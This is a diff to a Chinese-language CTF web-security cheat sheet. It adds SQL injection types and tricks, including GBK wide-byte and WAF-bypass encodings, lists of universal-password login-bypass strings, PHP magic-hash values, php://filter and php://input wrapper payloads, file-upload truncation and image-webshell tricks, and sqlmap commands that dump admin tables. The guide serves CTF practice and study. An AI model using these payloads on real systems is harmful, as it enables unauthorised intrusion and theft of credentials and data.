@@ -60,25 +60,92 @@ product.asp?id=1/1 -- true
 product.asp?id=1/0 -- false
 ```
 
-**sqlmap 使用**
+---
+
+**类型**
+
++   简单注入
+
+    ‘    and 1=1   or 1=2   ^ 1=1
+
++   宽字节注入
+
++   花式绕 MySQL
+
+    结合PHP特性
+
++   绕关键词检测拦截
+
+    大小写？
+
++   MongoDB 注入
+
+    NoSQLmap
+
++   http 头注入
+
+    X-Forward-注入
+
+    refer注入
+
++   二次注入
+
+    插入型，从另一个界面插入
+
+---
+
+**思路**
+
++   简单注入，手工或sqlmap跑
++   判断注入点，是否是http头注入？是否在图片处注入
++   判断注入类型
++   利用报错信息注入
++   尝试各种绕过过滤的方法
++   查找是否是通用某模板存在的注入漏洞
+
+---
+
+**Tricks**
 
 ```shell
-# 检查注入点：
-sqlmap -u http://aa.com/star_photo.php?artist_id＝11
+sql-mode = "STRICT_TRANS_TABLES"(默认未开启)
+插入长数据截断，插入'admin                      x'绕过或越权访问(束缚攻击？)
 
-# 爆当前数据库信息：
-sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db
+注意二次注入
+isg2015 web350 username 从 session 中直接带入查询，利用数据库字段长度截断，
+\ 被 gpc 后为 \\，但是被截断了只剩下一个 \，引发注入
 
-# 指定库名列出所有表
-sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
-('vhost48330' 为指定数据库名称)
+如果猜解不出数据库的字段，搜索后台，查看源代码，源代码登陆时的表单中的字段一般和数据库的相同
 
-# 指定库名表名列出所有字段
-sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
-('admin' 为指定表名称)
+# 绕过安全狗
+sel%ect
 
-# 指定库名表名字段dump出指定字段
-sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
+针对 asp + access，首先来挖掘一下数据库的特性：
+1.可代替空格的字符：%09, %0A, %0C, %0D
+2.可截断都免语句的注释符有：%00, %16, %22, %27
+3.当 %09, %0A, %0C或%0D超过一定长度后，安全狗的防御便失效了
+4.UserAgent：BaiduSpider
+
+有 magic_quotes_gpc = on 的情况下，
+提交的参数如果带有单引号"'"，就会被自动转义"\'"，使很多注入攻击无效
+
+gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0xFE,
+尾字节对应 0x40-0xfe(除0x7f)，刚好涵盖了转义字符\对应的编码 0x5c
+
+0xD50x5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，
+于是 %d5%5c 经URL解码后为“诚”
+
+0xD50x5c 不是唯一可以绕过单引号转义的字符，0x81-0xFE 开头 + 0x5c 的字符应该都可以
+
+
+# 偏移注入
+
+1.Union 合并查询需要列相等，顺序一样
+2.select * from admin as inner join 
+  index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)
+ 查询条件是 a 表的 id 列与 b 表的 id 列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回
+
+3.* 代表了所有字段，如查询 admin 表，他有几个字段，* 就代表几个字段
 ```
 
 
@@ -111,7 +178,49 @@ Enjoy the labs
 
 ## XSS
 
+类型：
+
++   简单存储型 xss 盲打管理员后台
++   各种浏览器 auditor 绕过
++   富文本过滤黑白名单绕过
++   CSP 绕过
++   Flash xss
++   AngularJS 客户端模板 xss
+
+工具：
+
++   bp
++   hackbar
+
++   xss 平台
++   swf decompiler
++   flasm
++   doswf(swf加密)
++   Crypt Flow(swf加密)
+
+思路：
+
++   简单的xss，未作任何过滤，直接利用xss平台盲打管理员cookie
++   过滤标签，尝试各种绕过方法
++   存在安全策略csp等，尝试相应的绕过方法
++   逆向 .swf 文件，审计源码，构造 xss payload
+
 ## 代码审计
+
+工具：
+
++   rips
++   seay
++   githack
++   stings, grep
+
+思路：
+
++   根据提示，猜测是否需要审计源代码
++   直接找到源代码，或者利用各种找源码的技巧找源码，或利用漏洞查看源码文件
++   人工审计代码，结合题目，找到存在注入的地方，或编写相应脚本等等
++   检索关键函数，admin(), check(), upload()
++   检索关键的文件，config.php, check.lib.php, xxx.class.php
 
 ## 文件上传
 
@@ -125,13 +234,15 @@ Enjoy the labs
 
     空格，加点，加下划线，双重后缀名，叠用 phphpp
 
-    PHP345别名绕过，.inc, .phtml, .phpt, .phps
+    PHP345，.inc, .phtml, .phpt, .phps
 
     %00截断：name=test.jpg0x00
 
+    ​		   1.php%00.png
+
     ​		   1.aspchr(0)&XXX.jpg,chr(0)
 
-    ​		    /1.php，在1.php前嫁个空格，在hex中找到20再改为00
+    ​		    /1.php，在1.php前加个空格，在hex中找到20再改为00
 
     .htaccess(文件重写)：
 
@@ -142,18 +253,18 @@ Enjoy the labs
     </FilesMatch>
     ```
 
-    http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，
-
-    可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码
-
 +   基于文件类型的检测
 
     Content-Type : Multipart/form-data; 大小写绕过
 
++   在线编辑器漏洞
+
++   文件包含
+
 +   基于文件头部信息的过滤
 
     ```shell
-    copy xx.png+xxx.php out.jpg
+    copy xx.png+xxx.php out.jpg  # win下的命令
     # 再修改下后缀名
     ```
 
@@ -167,19 +278,230 @@ Enjoy the labs
 about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php
 ```
 
+思路：
 
++   简单的上传文件，查看响应
+
++   是否只是前端过滤后缀名、文件格式，抓包绕过
+
++   是否存在截断上传漏洞
+
++   是否对文件头检测(图片马等等)
+
++   是否对内容进行了检测
+
++   是否上传吗被查杀，免杀
+
++   是否存在各种解析漏洞
+
++   http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，
+
+    可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码
 
 ## PHP 特性
 
+**类型：**
+
++   弱类型
++   intval
++   strpos 和 ===
++   反序列化 + destruct
++   \0 截断
++   iconv 截断
++   parse_str()
++   伪协议
+
+在线调试环境：http://www.shucunwang.com/RunCode/php
+
+**思路：**
+
++   判断是否存在 PHP 中截断特性
+
++   查看源码，判断是否存在 PHP 弱类型问题
+
++   查看源码，注意一些特殊函数，eval(), system(), intval()
+
++   构造变量，获取flag
+
++   是否存在 HPP
+
++   魔法哈希 0e开头，sha1(), md5()无法处理数组
+
+    常见的payload:
+
+    ​        QNKCDZO
+
+    ​        0e830400451993494058024219903391
+
+    ​        s155964671a
+
+    ​        0e342768416822451524974117254469
+
+    ​        s214587387a
+
+    ​        0e848240448830537924465865611904
+
+    ​        s878926199a
+
+    ​        0e545993274517709034328855841020
+
+    ​        s1091221200a
+
+    ​        0e940624217856561557816327384675
+
+    ​        s1885207154a
+
+    ​        0e509367213418206700842008763514
+
+    ​        s1836677006a
+
+    ​        0e481036490867661113260034900752
+
+    ​        s1184209335a
+
+    ​        0e072485820392773389523109082030
+
+    ​        s1665632922a
+
+    ​        0e731198061491163073197128363787
+
+    ​        s1502113478a
+
+    ​        0e861580163291561247404381396064
+
+    ​        s532378020a
+
+    ​        0e220463095855511507588041205815
+
+**伪协议**
+
++   php://filter – 对本地磁盘文件进行读写
+
+    查看源码：file=php://filter/read=convert.base64-encode/resource=index.php
+
++   php://input 伪协议需要服务器支持，同时要求 allow_url_include = on
+
+    fn=php://input，然后再 post 一个 fn=xx
+
++   php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区
+
++   php://memory 总是把数据存储在内存中
+
++   php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中
+
+DATA伪协议，分号和逗号有争议
+
++   data:,文本数据
++   data:text/plain ,文本数据
++   data:text/html,HTML代码
++   data:text/css;base64,css代码
++   data:text/javascript;base64,javascript代码
++   data:image/x-icon;base64,base64编码的 icon 图片数据
++   data:image/gif;base64,base64编码的gif图片数据
++   data:image/png;base64,base64编码的png图片数据
++   data:image/jpeg;base64,base64编码的png图片数据
+
+>   glob:// 查找匹配的文件路径模式
+
 ## 后台登录类
+
+**类型：**
+
++   各种万能密码绕过
++   变形的万能密码绕过
++   社工的方式得到后台密码
++   爆破的方式得到后台密码
++   各种 cms 后台登陆绕过
+
+```shell
+# asp万能密码
+'or'='or'
+
+# aspx万能密码
+1： "or "a"="a
+2： ')or('a'='a
+3：or 1=1--
+4：'or 1=1--
+5：a'or' 1=1--
+6： "or 1=1--
+7：'or'a'='a
+8： "or"="a'='a
+9：'or''='
+10：'or'='or'
+11: 1 or '1'='1'=1
+12: 1 or '1'='1' or 1=1
+13: 'OR 1=1%00
+14: "or 1=1%00
+15: 'xor
+16: 新型万能登陆密码
+用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
+密码 1
+Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
+Password=1
+17..admin' or 'a'='a 密码随便
+
+# PHP万能密码
+'or'='or'
+'or 1=1/*  字符型 GPC是否开都可以使用
+User: something
+Pass: ' OR '1'='1
+
+# jsp 万能密码
+1'or'1'='1
+admin' OR 1=1/*
+用户名：admin （系统存在此用户)
+密码：1'or'1'='1
+```
+
+
+
+**思路：**
+
++   根据提示，判断是否是普通的登陆绕过，或是利用社工的方式
++   普通登陆绕过尝试各种万能密码绕过，或通过普通的 sql 注入漏洞得到账号密码，或 xss 盲打
++   如果是 cms 系统登陆，查看是否有相应版本的后台绕过漏洞
++   如果是社工方式，谷歌，百度，社工库
++   爆破获取
++   robots.txt 找找后台
 
 ## 加解密
 
-## 
+**类型：**
 
-## 
++   简单的编码(多次 base64 编码)
++   密码题(hash 长度扩展、异或、移位加密各种变形)
++   js 加解密
++   根据加密源码写解密脚本
 
-## 
+**思路：**
+
++   判断是编码还是加密
++   如果是编码，判断编码类型，尝试解码或多次解码
++   如果是加密，判断是现有的加密算法，还是自写的加密算法
++   是否是对称加密，是否存在秘钥泄露等，获取秘钥解密
++   根据加密算法，推断出解密算法
+
+## 其他
+
+脑洞题
+
+**类型：**
+
++   爆破，包括MD5、爆随机数、验证码识别
+
++   社工，花式查社工库、微博、QQ签名、whois、谷歌  [天涯社工库](www.findmima.com)
+
++   SSRF，包括花式探测端口、302跳转、花式协议利用、gophar直接去shell等等
+
++   协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、
+
+    花式藏FLAG、花式分析数据包
+
+    X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。
+
+    标准格式如下：X-Forwarded-For: client1, proxy1, proxy2
+
++   XXE，各种 XML 存在地方(rss/word/流媒体)、各种XXE利用方法(文件读取)
 
 ## 工具
 
@@ -236,9 +558,7 @@ start attack  # 观察状态码和长度
 
 #### 实例
 
-
-
-目录与文件扫描
+##### 目录与文件扫描
 
 ##### 暴力破解后台
 
@@ -297,9 +617,6 @@ MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展�
 
 + 文件包含
 
-    ```shell
-    copy xx.png/b+xxx.php/a xxx.png
-    ```
 
 ##### 数据获取测试
 
@@ -312,6 +629,25 @@ sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables
 # 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生
 sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表
 sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地
+```
+
+```shell
+# 检查注入点：
+sqlmap -u http://aa.com/star_photo.php?artist_id＝11
+
+# 爆当前数据库信息：
+sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db
+
+# 指定库名列出所有表
+sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
+('vhost48330' 为指定数据库名称)
+
+# 指定库名表名列出所有字段
+sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
+('admin' 为指定表名称)
+
+# 指定库名表名字段dump出指定字段
+sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
 ```
 
 **参数解释**
@@ -584,6 +920,8 @@ class DBMS:
     HSQLDB = "HSQLDB"
 ```
 
+### nosqlmap
+
 ### nmap
 
 常用指令：
@@ -684,6 +1022,14 @@ nmap -p 80,443 --script=http-waf-detect 192.168.0.100
 nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
 ```
 
+### AWVS
+
+### Maltego
+
+### Social-Engineer Toolkit
+
+### Metasploit
+
 ### Hydra
 
 爆破利器
@@ -756,59 +1102,7 @@ hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh
  + 跑在什么系统上
  + 可以利用已知漏洞绕过题目直接拿flag
 
-### SQL 注入
 
-+   简单注入
-
-    ‘’    and 1=1   or 1=2   ^ 1=1
-
-+   宽字节注入
-
-+   花式绕 MySQL
-
-    结合PHP特性
-
-+   绕关键词检测拦截
-
-    大小写？
-
-+   MongoDB 注入
-
-    NoSQLmap
-
-+   http 头注入
-
-    X-Forward-注入
-
-    refer注入
-
-+   二次注入
-
-    插入型，从另一个界面插入
-
----
-
-**解题思路**
-
-+   简单注入，手工或sqlmap跑
-
-+   判断注入点，是否是http头注入？是否在图片处注入
-
-+   判断注入类型
-
-+   利用报错信息注入
-
-+   尝试各种绕过过滤的方法
-
-+   查找是否是通用某模板存在的注入漏洞
-
-    ……
-
-**Tricks**
-
-```shell
-sql-mode = "STRICT_TRANS_TABLES"(默认未开启)
-```
 
 
 
